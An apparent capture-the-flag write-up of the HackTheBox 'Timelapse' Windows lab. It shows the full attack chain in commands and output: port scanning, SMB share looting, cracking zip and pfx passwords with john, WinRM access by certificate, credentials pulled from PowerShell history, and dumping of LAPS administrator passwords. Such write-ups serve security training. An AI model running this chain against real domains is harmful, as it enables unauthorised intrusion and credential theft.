---
title: HTB | Timelapse
author: Zeropio
date: 2022-05-28
categories: [HackTheBox, Machines]
tags: [htb, windows, easy]
permalink: /htb/labs/machines/timelapse
---

![HTB Img](/assets/img/hackthebox/card/Timelapse.png)


# Enumeration
We can see thanks to the ping that is a Windows:
```
> ping 10.10.11.152
PING 10.10.11.152 (10.10.11.152) 56(84) bytes of data.
64 bytes from 10.10.11.152: icmp_seq=1 ttl=127 time=51.7 ms
```
**ttl=127**

First we scan the ports:
```
# Nmap 7.92 scan initiated Sun May 22 20:33:04 2022 as: nmap -p- -sS --min-rate 5000 --open -v -oG allPorts 10.10.11.152
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.11.152 ()	Status: Up
Host: 10.10.11.152 ()	Ports: 53/open/tcp//domain///, 88/open/tcp//kerberos-sec///, 135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 389/open/tcp//ldap///, 445/open/tcp//microsoft-ds///, 464/open/tcp//kpasswd5///, 636/open/tcp//ldapssl///, 3268/open/tcp//globalcatLDAP///, 3269/open/tcp//globalcatLDAPssl///, 5986/open/tcp//wsmans///, 9389/open/tcp//adws///, 49667/open/tcp/////, 49673/open/tcp/////, 49674/open/tcp/////, 49696/open/tcp/////, 61941/open/tcp/////	Ignored State: filtered (65518)
# Nmap done at Sun May 22 20:33:45 2022 -- 1 IP address (1 host up) scanned in 40.27 seconds
```

We executed the (getPorts.sh)[https://raw.githubusercontent.com/zeropio/the_helpful_scripts/main/nmap/getPorts.sh] command to scan each one:
```console
# Nmap 7.92 scan initiated Sat May 28 00:43:09 2022 as: nmap -sVC -p 53,88,135,139,389,445,464,636,3268,3269,5986,9389,49667,49673,49674,49696,61941 -Pn -oN nmapFull 10.10.11.152
Nmap scan report for 10.10.11.152
Host is up (0.065s latency).

PORT      STATE    SERVICE       VERSION
53/tcp    open     domain        Simple DNS Plus
88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2022-05-28 06:43:16Z)
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp   open     microsoft-ds?
464/tcp   open     kpasswd5?
636/tcp   open     tcpwrapped
3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp  open     tcpwrapped
5986/tcp  open     ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Not valid before: 2021-10-25T14:05:29
|_Not valid after:  2022-10-25T14:25:29
| tls-alpn: 
|_  http/1.1
|_ssl-date: 2022-05-28T06:44:46+00:00; +7h59m59s from scanner time.
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open     mc-nmf        .NET Message Framing
49667/tcp open     msrpc         Microsoft Windows RPC
49673/tcp open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open     msrpc         Microsoft Windows RPC
49696/tcp open     msrpc         Microsoft Windows RPC
61941/tcp filtered unknown
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h59m58s, deviation: 0s, median: 7h59m58s
| smb2-time: 
|   date: 2022-05-28T06:44:08
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
```

&nbsp;
---

# Explotation

## Samba
We can confirm that is a Windows. Let's try the samba:
```console
> smbclient -L \\\\10.10.11.152\\  
Password for [WORKGROUP\zeropio]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Shares          Disk      
	SYSVOL          Disk      Logon server share 
```

We can test those folders:
```console
> smbclient \\\\10.10.11.152\\ADMIN$
Password for [WORKGROUP\zeropio]:
tree connect failed: NT_STATUS_ACCESS_DENIED

> smbclient \\\\10.10.11.152\\C$    
Password for [WORKGROUP\zeropio]:
tree connect failed: NT_STATUS_ACCESS_DENIED

> smbclient \\\\10.10.11.152\\IPC$
Password for [WORKGROUP\zeropio]:
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_ACCESS_DENIED listing \*

> smbclient \\\\10.10.11.152\\NETLOGON
Password for [WORKGROUP\zeropio]:
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_ACCESS_DENIED listing \*

> smbclient \\\\10.10.11.152\\SYSVOL
Password for [WORKGROUP\zeropio]:
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_ACCESS_DENIED listing \*
```

Finally, **Shares** have some files:
```console
> smbclient \\\\10.10.11.152\\Shares
Password for [WORKGROUP\zeropio]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Oct 25 17:39:15 2021
  ..                                  D        0  Mon Oct 25 17:39:15 2021
  Dev                                 D        0  Mon Oct 25 21:40:06 2021
  HelpDesk                            D        0  Mon Oct 25 17:48:42 2021
```
We download all of them.

### zip
If we try to unzip the file:
```console
> unzip winrm_backup.zip                
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password: 
```

We need to break it with **john**:
```console
> sudo john --format=PKZIP --wordlist=/usr/share/wordlists/rockyou.txt zip-hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
**supremelegacy**    (winrm_backup.zip/legacyy_dev_auth.pfx)
```

### pfx
We get the following file: **legacyy_dev_auth.pfx**. If we try to open it, it ask for a password.
Let's break it with john again:
```console
> sudo john --format=pfx --wordlist=/usr/share/wordlists/rockyou.txt pfx-hash
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 512/512 AVX512BW 16x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
**thuglegacy**       (legacyy_dev_auth.pfx) 
```
We can see some ssl certs:
![HTB Img](/assets/img/hackthebox/labs/timelapse/zeropio-28012153.jpg)

```console
> openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out prv.key
> openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out cert.crt 
```

### shell
We can use **evil-winrm** to access. Thanks to the nmap we now that ssl is enable, so we need to add **-S**:
```console
> evil-winrm -i 10.10.11.152 -c cert.crt -k prv.key -S
Enter PEM pass phrase:
	*Evil-WinRM* PS C:\Users\legacyy\Documents>
```

&nbsp;
---

# Privilage Escalation
If we check the history we can see something:
```console
PS C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine> cat ConsoleHost_history.txt
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
```

We will set all the variables, know we can executed the code below in the history.
Let's try to get the admin password with LDAP:
```console
PS C:\Users> invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime}
```

Now we just need to login as **Administrator**:
```console
> evil-winrm -i 10.10.11.152 -S -u 'Administrator' -p 'h8#+vv+;q{E4u9+9u+-2c%+;' 
```
